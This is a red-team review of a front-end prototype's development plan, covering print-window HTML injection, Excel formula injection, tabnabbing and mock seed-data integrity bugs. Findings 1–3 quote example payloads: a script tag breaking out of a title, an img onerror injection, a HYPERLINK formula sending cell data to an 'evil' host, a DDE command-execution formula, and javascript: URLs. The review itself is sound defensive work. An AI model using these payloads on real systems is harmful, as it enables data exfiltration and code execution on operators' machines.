# Red-Team Plan Review — Security / Data-Integrity Adversary

**Plan:** `plans/260703-1908-reference-ui-parity-tdd/` (plan.md + 7 phase files)
**Reviewer role:** Security/Data-Integrity Adversary + Fact Checker
**Scope caveat:** mock-data prototype, no real backend. Findings focus on data-integrity hazards, the two "real" surfaces (client `.xlsx` export + print/`window.open`), external embeds/links, and the permission mock. Every finding is backed by `file:line` evidence.

---

## Finding 1: Print-window helper writes untrusted mock free-text into a new document with no escaping path — HTML/attribute injection

- **Severity:** High
- **Location:** Phase 2, Architecture §Print + Implementation Step 4 (`src/components/print/print-window.tsx`, `openPrintWindow`); consumed by Phase 3 Step 13 prints, Phase 4 Step 6 tem/receipt prints.
- **Flaw:** The plan specifies `openPrintWindow(title, element)` = `renderToStaticMarkup` → `window.open` → "write doc with inline base print CSS". `renderToStaticMarkup` escapes React children, but the plan also injects a **plain-string `title`** into `<title>{title}</title>` when building the doc string (Phase 2 test asserts `writes doc containing <title>Phiếu test</title>`, phase-02 line 109). Print doc titles in later phases are data-derived — e.g. Phase 4 tem layout carries `số phiếu, model, serial` and Phase 3 receipts carry customer name/address. If `title` or any field is concatenated into the HTML string rather than passed as React children, mock free-text (`hoTen`, `diaChi`, `ghiChu`, `Mô tả hư hỏng`) breaks out of context. The plan gives no escaping/`renderToStaticMarkup`-only guarantee for the title or the surrounding doc scaffold, and there is **no existing safe precedent** to copy.
- **Failure scenario:** A seeded/quick-created customer name or note containing `</title><script>…` or `"><img onerror=…>` (Phase 4 C4 quick-create khách hàng accepts arbitrary text; Phase 3 R11 renders `Ghi chú = HH: <fault>`) is written into the print window doc string, executing in the `window.open` document. This pattern is explicitly slated to "ship to real reference-parity later" — the injection travels to any future real backend/PII data.
- **Evidence:**
  - `plans/.../phase-02-...md:52` — "`renderToStaticMarkup` (react-dom/server) → `window.open` → write doc with inline base print CSS".
  - `plans/.../phase-02-...md:109` — test asserts doc contains literal `<title>Phiếu test</title>` (string interpolation of title).
  - `plans/.../phase-04-...md:120` (tem layout), `phase-03-...md:113` (5 prints of filtered rows) — data-derived doc content.
  - `grep -rn "renderToStaticMarkup\|document.write\|dangerouslySetInnerHTML" src/` → **zero matches** (no existing safe scaffold; net-new unsafe pattern).
- **Suggested fix:** Mandate in the phase file: the entire document body AND the title must be produced by `renderToStaticMarkup` of a React tree (title via a `<title>{title}</title>` element inside the rendered tree), never by string concatenation of caller-supplied values. Add a spec test that `openPrintWindow('</title><script>x</script>', …)` produces escaped output (`&lt;/title&gt;`). Prefer writing to an iframe `srcdoc` over `document.write`.

---

## Finding 2: Client `.xlsx` exporter has no CSV/formula-injection sanitization — cells beginning `= + - @` execute in Excel

- **Severity:** High
- **Location:** Phase 2, Architecture §Exporter + Step 3 (`src/lib/export-xlsx.ts`, `buildSheetAoa` / `exportToXlsx`); consumed by Phase 3 (Xuất Excel File/In), Phase 5–7 every "Xuất Excel".
- **Flaw:** The exporter maps arbitrary row values straight into SheetJS cells (`columns = { header, accessor: (row) => string | number | null }`). No mention of neutralizing leading `=`, `+`, `-`, `@`, tab, or CR (the classic formula-injection prefixes). The exported set is the **full filtered row set** including free-text fields (customer name, address, `Ghi chú`, `Nội dung sửa chữa`, dealer names). Mock data today is benign, but the plan itself frames the exporter as the reusable primitive that later carries reference/real data, and quick-create modals (Phase 4 C4) let a user type any string into fields that then export.
- **Failure scenario:** A customer/dealer/note value like `=HYPERLINK("http://evil/?"&A1,"click")` or `=cmd|'/c calc'!A1` (DDE) is entered via a quick-create modal or arrives in seed, exported via "Xuất Excel File", and executes when the operator opens the `.xlsx` in Excel — data exfiltration or command execution on the operator's machine. This is the one genuinely "real" (non-mock) code path the export touches, exactly the surface the review targets.
- **Evidence:**
  - `plans/.../phase-02-...md:51` — accessor returns raw `string | number | null`; `XLSX.utils.aoa_to_sheet` + `writeFile`, no sanitize step.
  - `plans/.../phase-02-...md:108` — test only asserts header order + `.xlsx` filename, no injection test.
  - `plans/.../phase-03-...md:113` — "Excel handlers call P2 `exportToXlsx` with full filtered rows".
  - `grep -rn "sanitiz\|formula\|escape" plans/260703-1908-reference-ui-parity-tdd/` → **no matches** (sanitization never mentioned).
  - `grep -n "xlsx" package.json` → not yet a dep (net-new).
- **Suggested fix:** In `buildSheetAoa`, prefix any string cell whose first char ∈ `= + - @ \t \r` with a leading apostrophe (or set the cell as forced-text `t:'s'` and guard the value). Add a spec test: a row value `=1+1` exports as `'=1+1` (text), not a formula. Document this as the exporter's contract so every consumer inherits it.

---

## Finding 3: `Bản đồ` / `Định vị` / branch-map open external URLs in new tabs from row data with no URL-encoding and (per plan) no `rel="noopener"` — tabnabbing + URL/param injection

- **Severity:** High
- **Location:** Phase 3, R11 + Step 8 (Khách hàng cell: `Bản đồ` → `window.open('https://maps.google.com/?q='+addr)`, `Định vị` = GPS URL new tab); Phase 2, R11 + Step 19 (`BranchMapModal` OpenStreetMap iframe embed on branch Toạ độ).
- **Flaw:** Two problems. (a) The address is concatenated into the maps URL with `+addr`, no `encodeURIComponent` — an address containing `#`, `&`, or a full `https://…` string (mock `diaChi` / quick-created customer address is free text) corrupts the query or redirects the map to an attacker-chosen location; the `Định vị` "GPS URL" is opened directly from row data with no validation of scheme (a `javascript:`/`data:` value in a coordinate field would execute on `window.open`). (b) `window.open(...)` without `,'_blank','noopener'` (or anchor `rel="noopener noreferrer"`) leaves the opened page with a live `window.opener` handle → reverse tabnabbing. The plan never mentions `noopener`/`noreferrer`/`encodeURIComponent`, and there is **no existing `window.open`/`target=_blank` usage** in the repo to inherit a safe convention from.
- **Failure scenario:** A seeded or quick-created customer whose `diaChi`/coordinate field is attacker-controlled (Phase 4 quick-create khách hàng, Phase 7 Chi nhánh Toạ độ free-text `Nhập tọa độ VD(...)`) causes `Định vị` to open `javascript:...` or `Bản đồ` to open a phishing origin that then rewrites the opener tab via `window.opener.location`. In the OSM iframe case, an unescaped Toạ độ string injected into the iframe `src` can point the embed anywhere.
- **Evidence:**
  - `plans/.../phase-03-...md:37` (R11) — "`Bản đồ` button (opens `https://maps.google.com/?q=<address>` new tab), `Định vị` link (GPS URL new tab)".
  - `plans/.../phase-03-...md:107` (Step 8) — literal `window.open('https://maps.google.com/?q='+addr)` (string concat, no encode, no opener flag).
  - `plans/.../phase-02-...md:145` (Step 19) — "OpenStreetMap iframe embed centered on selected branch coordinates".
  - `plans/.../phase-07-...md:44` (A1) — Toạ độ is a free-text form field (`Nhập tọa độ VD(21.029743, 105.833882)`).
  - `grep -rn "window.open\|target=\"_blank\"\|noopener\|encodeURI" src/` → **zero matches** (no safe precedent).
- **Suggested fix:** Specify `window.open(url, '_blank', 'noopener,noreferrer')` (or anchors with `rel="noopener noreferrer"`); build the maps URL with `encodeURIComponent(addr)`; validate the `Định vị`/Toạ độ value against a strict `-?\d+\.\d+,\s*-?\d+\.\d+` lat/long regex before use and drop the link if it fails; validate the OSM iframe `src` is a constructed, param-encoded URL, never raw concatenation.

---

## Finding 4: New relational seed modules pick "unique seed numbers" that are never specified — collides with an existing already-duplicated seed space (2001/2002/2003), reintroducing determinism drift

- **Severity:** Medium
- **Location:** Phase 1, Architecture §New seed modules + Steps 9–18 (`ky.ts`, `chung-tu.ts`, `cong-no.ts`, `tra-hang.ts`, `cham-cong.ts`, `loi-sua-chua.ts`, `phi-giao.ts`).
- **Flaw:** The plan says all new modules "reuse `SeededRandom` (C4) with **new unique seed numbers**" but never assigns them, and its own claim that seeds are unique is already false in the repo: seeds `2001/2002/2003` are used by BOTH `finance-mock.ts` AND three HR pages. The seed space is unmanaged (masterdata 1001–1023, HR/finance 2001–2003 ×2, inventory 3001–3008, seed/ 8001–8005, reference-data 99, misc 42). A new `cham-cong.ts` (HR domain) or `chung-tu.ts` (finance domain) is the most likely to reuse 2xxx and silently produce **identical RNG streams** to an existing module — not an id collision per se, but correlated/duplicate value patterns that violate the "deterministic + realistic" invariant and can produce duplicate human-facing codes if the same counter logic is shared.
- **Failure scenario:** Author picks `SeededRandom(2002)` for `cham-cong.ts` (mirroring the existing `ChamCongPage` seed), yielding the same pseudo-random sequence as `finance-mock` `rngCN` / `ChamCongPage`; downstream fields (dates, amounts, picked names) correlate in a way that looks like a data bug during review, and any shared `padStart` counter pattern can emit colliding document codes. Nothing in the TDD plan tests cross-module seed uniqueness.
- **Evidence:**
  - `plans/.../phase-01-...md:53` — "new unique seed numbers" (unspecified).
  - `grep -rhoE "new SeededRandom\(([0-9]+)" src/ | ... | uniq -c` → `2 2003`, `2 2002`, `2 2001` (already duplicated).
  - `src/mock/finance-mock.ts:17,82,127` = 2001/2002/2003; `src/pages/nhan-su/{BangLuongPage,ChamCongPage,ChamCongTongHopPage}.tsx:32,28,28` = 2001/2002/2003 (collision exists today).
  - `src/mock/seed/financials.ts:23` = 8005 (being deleted; number freed but not reassigned in plan).
- **Suggested fix:** Add a seed-number registry (e.g. in `seeded-random.ts` doc or `seed/index.ts`) and assign explicit non-overlapping seeds to the 7 new modules (e.g. 8006–8012). Add a build-time or test-time assertion that every `new SeededRandom(n)` uses a distinct `n` across `src/mock/seed/**`. Do NOT reuse a 2xxx value.

---

## Finding 5: Two divergent sources of truth for Công nợ / Thu-Chi — new `seed/cong-no.ts` (`conLai > 0`) contradicts existing `finance-mock.ts` `CONG_NO_ROWS` (`conLai === 0` allowed); plan never reconciles them

- **Severity:** Medium
- **Location:** Phase 1 Steps 13–14 (create `chung-tu.ts`, `cong-no.ts`) vs untouched `src/mock/finance-mock.ts`; Phase 6 §finance (consumes `finance-mock.ts`, not the new seed modules).
- **Flaw:** Phase 1 introduces `seed/cong-no.ts` with invariant **`conLai === soTien - daTra` and `conLai > 0`** (test 2.6) and `seed/chung-tu.ts` (thu-chi). But `finance-mock.ts` already ships a full parallel implementation: `CONG_NO_ROWS` (with `con_lai`, and `daTT` can equal `goc` → `conLai === 0`), `THU_CHI_ROWS`, `congNoApi`, `thuChiApi`, `HOA_DON_ROWS`. Phase 6 (the finance phase) lists `finance-mock.ts` as consumed/modified and reworks `ThuChiPage`/`CongNoPage` against it — **not** against the new `seed/cong-no.ts`. So Phase 1 builds relational seed the finance pages will not use, while the finance pages keep a second, contradictory model (snake_case fields, `Phai Thu`/`Phai Tra` vs `Phiếu sửa chữa`/`Phiếu bán hàng`, `conLai` can be 0). Which one is canonical is never stated → guaranteed drift and reviewer confusion, and a real risk that D3 "reference is the data spec" is satisfied in one module and violated in the other.
- **Failure scenario:** Phase 6 renders Công nợ from `finance-mock.CONG_NO_ROWS` (with fully-paid `conLai===0` rows and `Qua han`/`Con no` statuses), while `seed/cong-no.ts` (built in P1, tested to never have `conLai===0`) sits unused or is wired into a different surface — the app shows two inconsistent công-nợ datasets, and the P1 test suite passes while the visible finance page contradicts it.
- **Evidence:**
  - `src/mock/finance-mock.ts:84-123` — `CONG_NO_ROWS`, `con_lai`, `daTT = ... int(0, goc/10000)*10000` (can equal `goc` → `conLai===0`), `congNoApi`.
  - `plans/.../phase-01-...md:85` (test 2.6) — new seed requires `conLai > 0` (opposite invariant).
  - `plans/.../phase-06-...md:17,85,88` — Phase 6 consumes/modifies `src/mock/finance-mock.ts` + `finance-tables/{thu-chi,cong-no,hoa-don}.config.ts`; no reference to `seed/cong-no.ts` / `seed/chung-tu.ts`.
  - `grep -n "cong-no\|chung-tu\|SEED_CONG_NO\|SEED_CHUNG_TU" phase-06-...md` → no matches (reconciliation absent).
- **Suggested fix:** Add an explicit reconciliation step: either (a) P1's `chung-tu.ts`/`cong-no.ts` REPLACE `finance-mock.ts` finance rows and P6 rewires `congNoApi`/`thuChiApi` to them, or (b) drop the new P1 finance seed modules and extend `finance-mock.ts` in place. State the single source of truth and the shared `conLai` invariant. Delete-or-migrate decision must be in a phase file, not left implicit.

---

## Finding 6: `KT_BOARD_STATUS_IDS` ordering is contradicted across phases — P1 canonical order ≠ P4 filter-option order, both claim to assert "against P1"

- **Severity:** Medium
- **Location:** Phase 1 §5b (`KT_BOARD_STATUS_IDS = [2,4,6,7,8,9,13,15,16,17]`) vs Phase 4 KT-board test (10 pairs in order `[2,4,15,6,7,13,17,16,8,9]`) vs Phase 3 legend display order `[1,2,4,15,6,17,13,7,8,11,16,9,10,12,14]`.
- **Flaw:** P1 defines `KT_BOARD_STATUS_IDS` in numeric-ascending order `[2,4,6,7,8,9,13,15,16,17]`. P4's KT-board spec test enumerates the 10 filter options in a **different order** — `Đã Điều Phối(2), Báo Giá(4), Chờ Báo Giá(15), Chờ Xác Nhận(6), Chờ Linh Kiện(7), Đã Có Linh Kiện(13), Đã Đặt Linh Kiện(17), Chờ Phiếu Hãng(16), Trả Lại(8), Sửa Xong(9)` = `[2,4,15,6,7,13,17,16,8,9]` — yet claims it is "asserted against P1 `KT_BOARD_STATUS_IDS`". A deep-equal/index-wise assertion of P4's option order against P1's array will **fail**, because the two orderings differ. If the author "fixes" the test by reordering `KT_BOARD_STATUS_IDS` to match P4, it breaks P1's own success-criterion (`KT_BOARD_STATUS_IDS === [2,4,6,7,8,9,13,15,16,17]`) and any P3/P5/P7 consumer expecting ascending order.
- **Failure scenario:** During P4, the spec test comparing the rendered 10-option filter to `KT_BOARD_STATUS_IDS` fails; the implementer edits the P1 constant to appease P4, silently violating P1's locked success criterion and the P3 legend display-order test — a cross-phase integrity break that CI catches only if both phase test suites run together.
- **Evidence:**
  - `plans/.../phase-01-...md:80,99,120` — `KT_BOARD_STATUS_IDS = [2,4,6,7,8,9,13,15,16,17]` (ascending, locked).
  - `plans/.../phase-04-...md:110` — KT filter options listed as `2,4,15,6,7,13,17,16,8,9` "asserted against P1 `KT_BOARD_STATUS_IDS`".
  - `plans/.../phase-03-...md:20,90` — status-legend order is yet a third sequence `[1,2,4,15,6,17,13,7,8,11,16,9,10,12,14]`.
- **Suggested fix:** Separate the concerns: keep `KT_BOARD_STATUS_IDS` as the membership set (order-agnostic), and define an explicit `KT_BOARD_DISPLAY_ORDER` (and `LEGEND_DISPLAY_ORDER`) constant in P1. Have P4/P3 assert membership via set-equality and display via the dedicated order constant, so no phase mutates the shared set to satisfy an ordering test.

---

## Finding 7: Regenerated customer seed adds a self-referential parent link (`daiLyTramId`) and cross-refs (`nguoiTaoId`, chung-tu/cong-no `soPhieuScNk`, `ktvId`) whose referential integrity depends on generation ORDER and count-matching that the seed uses no structural guarantee for

- **Severity:** Medium
- **Location:** Phase 1 Steps 11, 13, 14 + tests 2.4/2.5/2.6 (customers `daiLyTramId`/`nguoiTaoId`; chung-tu `soPhieuScNk`; cong-no ticket/`ktvId` links).
- **Flaw:** Current referential integrity is guaranteed only by **index-range coincidence**: `repair-tickets.ts` links `customerIdx = rng.int(1,150)` because there are exactly 150 customers, `productIdx = rng.int(1,80)` because exactly 80 products, staff by branch range `1–20`/`21–30`. The plan regenerates customers with a NEW self-reference: `daiLyTramId` = "parent = earlier customer with `loai` 2/4", "first ~10 customers generated as dealer types". This is an ordering-dependent invariant with no structural enforcement — if the weighted `loai` roll produces zero dealers in the first 10 (weighting is "mostly Khách lẻ"), later customers have no valid parent and either get a dangling `daiLyTramId` or a null the test doesn't cover. Likewise `chung-tu` `soPhieuScNk` links to `SEED_REPAIR_TICKETS` for "repair-thu rows" and `cong-no` derives from "tickets with `chiPhi > 0`" — but P1 also changes ticket `chiPhi` rules (`chiPhi = 0` for status 12) and regenerates statuses, so the set of `chiPhi > 0` tickets shifts. The seed-integrity test only checks the ORIGINAL fixed refs (customerId/productId/staffId resolve); the NEW cross-refs are tested per-module but not for the failure mode "parent pool empty" or "int(1,150) after customer count changes".
- **Failure scenario:** A weighting change (or the `loai` roll) yields <1 dealer among the first 10 customers → every subsequent `daiLyTramId` points to a non-existent or wrong-`loai` parent; the `customers.test.ts` assertion "`daiLyTramId` (when set) resolves to a customer whose `loai` ∈ {2,4}" fails intermittently as weights are tuned, OR passes because the generator sets `daiLyTramId` null and the "dealer hierarchy" is silently empty. If any future edit changes customer count away from 150, `repair-tickets` `int(1,150)` produces dangling `customerId` — a latent trap the plan preserves.
- **Evidence:**
  - `src/mock/seed/repair-tickets.ts:108-118` — `customerIdx = rng.int(1, 150)`, `productIdx = rng.int(1, 80)`, staff `int(1,20)/int(21,30)` (integrity by count-coincidence only).
  - `plans/.../phase-01-...md:105` (Step 11) — `daiLyTramId (parent = earlier customer with loai 2/4)`, "First ~10 customers generated as dealer types".
  - `plans/.../phase-01-...md:83` (test 2.4) — asserts resolution "when set", not the empty-parent-pool failure mode.
  - `plans/.../phase-01-...md:106,55` — ticket `chiPhi = 0` for status 12 and "Công nợ derives from tickets with `chiPhi > 0`" (coupled invariants across regenerated seeds).
- **Suggested fix:** Make parent selection structural, not order-lucky: generate a fixed dealer pool array first, assert `dealers.length > 0` in the module, and pick parents from it (fail loudly if empty). Add a seed-integrity assertion that no `daiLyTramId`/`nguoiTaoId`/`soPhieuScNk`/`ktvId` is dangling AND that the `chiPhi>0` ticket pool used by cong-no is non-empty. Replace `int(1,count)` index-linking with `rng.pick(SEED_CUSTOMERS).id` so integrity survives count changes.

---

## Finding 8: `cong-no` `daTra ∈ [0, soTien)` uses inclusive-range RNG — off-by-one lets `daTra === soTien` (or `conLai === 0`), contradicting the `conLai > 0` test invariant

- **Severity:** Medium
- **Location:** Phase 1 Step 14 + test 2.6 (`cong-no.ts`: `daTra (0 ≤ daTra < soTien)`, invariant `conLai > 0`).
- **Flaw:** `SeededRandom.int(min, max)` is **inclusive on both ends** (`Math.floor(next()*(max-min+1))+min`). The plan writes the intended range as `0 ≤ daTra < soTien` (exclusive max) and the test asserts `conLai === soTien - daTra` AND `conLai > 0`. If the implementer computes `daTra = rng.int(0, soTien)` (the natural translation) or derives it in units (as `finance-mock.ts` does: `daTT = int(0, goc/10000)*10000` which **can equal `goc`**), `daTra === soTien` occurs → `conLai === 0` → the `conLai > 0` spec test fails, or worse is loosened to `>= 0` to pass, corrupting the "outstanding receivable" meaning (a receivable with nothing outstanding).
- **Failure scenario:** Deterministic seed happens to roll `daTra === soTien` for at least one of ~75 rows → `cong-no.test.ts` red; a hurried fix weakens the assertion to `conLai >= 0`, and the Công nợ page then lists fully-paid rows as outstanding debt — exactly the corruption `finance-mock.ts` already exhibits (`conLai===0` rows tagged `Da thanh toan` there, but the new module has no such status handling).
- **Evidence:**
  - `src/lib/seeded-random.ts:28-30` — `int(min,max)` returns value in `[min,max]` inclusive.
  - `plans/.../phase-01-...md:108` (Step 14) — `daTra (0 ≤ daTra < soTien)`, `conLai (computed)`.
  - `plans/.../phase-01-...md:85` (test 2.6) — asserts `conLai === soTien - daTra` and `conLai > 0`.
  - `src/mock/finance-mock.ts:90-92` — precedent bug shape: `daTT = int(0, goc/10000)*10000` can equal `goc`, `conLai = goc - daTT` can be 0.
- **Suggested fix:** Specify `daTra = rng.int(0, soTien - 1)` (or `rng.int(0, soTien - minUnit)` in whatever unit), and add the boundary assertion `daTra < soTien` in the module. Keep the `conLai > 0` test as-is (do not weaken). If fully-paid receivables are legitimately part of the domain, model them explicitly with a status field rather than allowing `conLai===0` to slip through the "outstanding" list.

---

## Non-issue (documented, not a finding): Permission mock is honestly labeled cosmetic

The brief flagged the localStorage `pt-permissions` matrix as a possible false-security surface. Verified: there is **no** auth/permission enforcement anywhere in the codebase today (`grep -rn "hasPermission\|RequireAuth\|ProtectedRoute\|useAuth\|authorize" src/` finds only route *path* references under `/phan-quyen`, no guards). The plan is explicit and repeated that the matrix is a pure UI mock with **no runtime enforcement** (plan.md open-decision #3; phase-07 line 59 "No runtime enforcement — pure UI mock"; line 114 success-criterion "no runtime enforcement"). It is not presented as access control and no UI is gated by the persisted state. This is the correct posture for a mock prototype — no finding, but flag for the future: when a real backend lands, `pt-permissions` must not be mistaken for the authorization source, and the "no enforcement" caveat must be carried into README/ARCHITECTURE so a later contributor doesn't wire UI gating to client-persisted permission state.

---

## Unresolved questions for the planner

1. **Finance source of truth (Finding 5):** are `seed/chung-tu.ts` + `seed/cong-no.ts` intended to replace `finance-mock.ts`, or is one of them redundant? This must be decided before P1 builds unused seed.
2. **KT order (Finding 6):** confirm whether KT-board filter display order is `[2,4,15,6,7,13,17,16,8,9]` (P4) or ascending (P1) — and split membership from display order.
3. **Print/export sanitization (Findings 1–2):** are HTML-escaping (print) and formula-neutralization (xlsx) in scope for the P2 primitives, given they are billed as the reusable exporters that later carry reference/real data? Recommend yes — cheapest to bake into the primitive now.
4. **New-tab hardening (Finding 3):** confirm `noopener`/`encodeURIComponent`/coordinate-scheme validation are required for `Bản đồ`/`Định vị`/branch-map, or explicitly accepted as mock-only risk.

---

Status: DONE
Summary: 8 findings (2 High print/xlsx-injection, 1 High new-tab/URL-injection, 5 Medium data-integrity: seed-collision, dual finance source-of-truth, KT order contradiction, order-dependent referential integrity, inclusive-RNG conLai off-by-one); permission mock verified honestly cosmetic (non-issue); every finding backed by file:line evidence.
